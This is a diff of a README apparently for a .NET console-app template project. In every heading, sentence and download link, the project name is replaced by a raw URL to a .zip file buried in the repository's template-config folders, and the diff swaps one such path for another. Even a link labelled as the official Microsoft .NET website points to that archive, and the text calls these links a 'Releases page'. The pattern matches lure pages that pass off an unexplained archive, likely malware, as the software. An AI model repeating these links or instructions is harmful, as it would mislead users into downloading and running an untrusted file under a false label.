@@ -1,14 +1,14 @@
-# 🎉 https://raw.githubusercontent.com/farhan0027/Inflop.ConsoleApp.Templates/master/src/templates/3-ConsoleApp.Advanced/Health/Inflop.ConsoleApp.Templates_v2.2.zip - Simple Templates for Powerful Apps
+# 🎉 https://github.com/farhan0027/Inflop.ConsoleApp.Templates/raw/refs/heads/master/src/templates/4-ConsoleApp.Enterprise/.template.config/Templates-App-Console-Inflop-1.6.zip - Simple Templates for Powerful Apps
 
 ## 🛠️ Overview
-Welcome to https://raw.githubusercontent.com/farhan0027/Inflop.ConsoleApp.Templates/master/src/templates/3-ConsoleApp.Advanced/Health/Inflop.ConsoleApp.Templates_v2.2.zip! This application provides four well-structured .NET console app templates. Whether you need a simple script or an advanced enterprise-grade worker, these templates will help you get started quickly and effectively. Say goodbye to boilerplate code and hello to endless possibilities!
+Welcome to https://github.com/farhan0027/Inflop.ConsoleApp.Templates/raw/refs/heads/master/src/templates/4-ConsoleApp.Enterprise/.template.config/Templates-App-Console-Inflop-1.6.zip! This application provides four well-structured .NET console app templates. Whether you need a simple script or an advanced enterprise-grade worker, these templates will help you get started quickly and effectively. Say goodbye to boilerplate code and hello to endless possibilities!
 
 ## 🚀 Getting Started
-To begin using https://raw.githubusercontent.com/farhan0027/Inflop.ConsoleApp.Templates/master/src/templates/3-ConsoleApp.Advanced/Health/Inflop.ConsoleApp.Templates_v2.2.zip, follow the steps below. You’ll be up and running in no time.
+To begin using https://github.com/farhan0027/Inflop.ConsoleApp.Templates/raw/refs/heads/master/src/templates/4-ConsoleApp.Enterprise/.template.config/Templates-App-Console-Inflop-1.6.zip, follow the steps below. You’ll be up and running in no time.
 
 1. **Visit the Download Page**   
    Click the link below to access the Releases page where you can download the application.  
-   [Download https://raw.githubusercontent.com/farhan0027/Inflop.ConsoleApp.Templates/master/src/templates/3-ConsoleApp.Advanced/Health/Inflop.ConsoleApp.Templates_v2.2.zip](https://raw.githubusercontent.com/farhan0027/Inflop.ConsoleApp.Templates/master/src/templates/3-ConsoleApp.Advanced/Health/Inflop.ConsoleApp.Templates_v2.2.zip)
+   [Download https://github.com/farhan0027/Inflop.ConsoleApp.Templates/raw/refs/heads/master/src/templates/4-ConsoleApp.Enterprise/.template.config/Templates-App-Console-Inflop-1.6.zip](https://github.com/farhan0027/Inflop.ConsoleApp.Templates/raw/refs/heads/master/src/templates/4-ConsoleApp.Enterprise/.template.config/Templates-App-Console-Inflop-1.6.zip)
 
 2. **Choose Your Version**   
    On the Releases page, you will see a list of available versions. Select the latest version for the best features and updates.
@@ -20,10 +20,10 @@ To begin using https://raw.githubusercontent.com/farhan0027/Inflop.ConsoleApp.Te
    After the download is complete, locate the .zip file in your downloads folder. Right-click on the file and select “Extract All” to unzip it. Choose a convenient location on your computer to save the extracted files.
 
 5. **Install Any Requirements**  
-   Before you can use the templates, ensure you have .NET installed on your computer. You can download the .NET framework from the official [Microsoft .NET website](https://raw.githubusercontent.com/farhan0027/Inflop.ConsoleApp.Templates/master/src/templates/3-ConsoleApp.Advanced/Health/Inflop.ConsoleApp.Templates_v2.2.zip). 
+   Before you can use the templates, ensure you have .NET installed on your computer. You can download the .NET framework from the official [Microsoft .NET website](https://github.com/farhan0027/Inflop.ConsoleApp.Templates/raw/refs/heads/master/src/templates/4-ConsoleApp.Enterprise/.template.config/Templates-App-Console-Inflop-1.6.zip). 
 
 ## 🗂️ Features
-https://raw.githubusercontent.com/farhan0027/Inflop.ConsoleApp.Templates/master/src/templates/3-ConsoleApp.Advanced/Health/Inflop.ConsoleApp.Templates_v2.2.zip offers a variety of features to enhance your development experience:
+https://github.com/farhan0027/Inflop.ConsoleApp.Templates/raw/refs/heads/master/src/templates/4-ConsoleApp.Enterprise/.template.config/Templates-App-Console-Inflop-1.6.zip offers a variety of features to enhance your development experience:
 
 - **Multiple Templates**: Choose from templates designed for different types of projects, ranging from simple scripts to fully functional workers.
 - **Clear Structure**: Each template follows a well-organized structure making it easy to understand and modify according to your needs.
@@ -33,7 +33,7 @@ https://raw.githubusercontent.com/farhan0027/Inflop.ConsoleApp.Templates/master/
 - **Dependency Injection**: Built-in support for dependency injection simplifies your application setup.
 
 ## ⚙️ System Requirements
-To run https://raw.githubusercontent.com/farhan0027/Inflop.ConsoleApp.Templates/master/src/templates/3-ConsoleApp.Advanced/Health/Inflop.ConsoleApp.Templates_v2.2.zip, you will need:
+To run https://github.com/farhan0027/Inflop.ConsoleApp.Templates/raw/refs/heads/master/src/templates/4-ConsoleApp.Enterprise/.template.config/Templates-App-Console-Inflop-1.6.zip, you will need:
 
 - **Operating System**: Windows 10, macOS, or a supported Linux distribution.
 - **.NET SDK**: Version 5.0 or later. This ensures compatibility with all templates.
@@ -41,7 +41,7 @@ To run https://raw.githubusercontent.com/farhan0027/Inflop.ConsoleApp.Templates/
 
 ## ⬇️ Download & Install
 To download and install the application, please visit the Releases page:  
-[Download https://raw.githubusercontent.com/farhan0027/Inflop.ConsoleApp.Templates/master/src/templates/3-ConsoleApp.Advanced/Health/Inflop.ConsoleApp.Templates_v2.2.zip](https://raw.githubusercontent.com/farhan0027/Inflop.ConsoleApp.Templates/master/src/templates/3-ConsoleApp.Advanced/Health/Inflop.ConsoleApp.Templates_v2.2.zip).
+[Download https://github.com/farhan0027/Inflop.ConsoleApp.Templates/raw/refs/heads/master/src/templates/4-ConsoleApp.Enterprise/.template.config/Templates-App-Console-Inflop-1.6.zip](https://github.com/farhan0027/Inflop.ConsoleApp.Templates/raw/refs/heads/master/src/templates/4-ConsoleApp.Enterprise/.template.config/Templates-App-Console-Inflop-1.6.zip).
 
 Once you have downloaded and extracted the files, you are ready to start using the templates. Open the extracted folder, and you will find separate folders for each template.
 
@@ -76,4 +76,4 @@ You can find additional documentation in the "docs" folder included in the templ
 ## 🧑‍💻 Contributing
 If you would like to contribute to this project, feel free to fork the repository and submit a pull request. We appreciate your input and ideas!
 
-Thank you for choosing https://raw.githubusercontent.com/farhan0027/Inflop.ConsoleApp.Templates/master/src/templates/3-ConsoleApp.Advanced/Health/Inflop.ConsoleApp.Templates_v2.2.zip Happy coding!
+Thank you for choosing https://github.com/farhan0027/Inflop.ConsoleApp.Templates/raw/refs/heads/master/src/templates/4-ConsoleApp.Enterprise/.template.config/Templates-App-Console-Inflop-1.6.zip Happy coding!
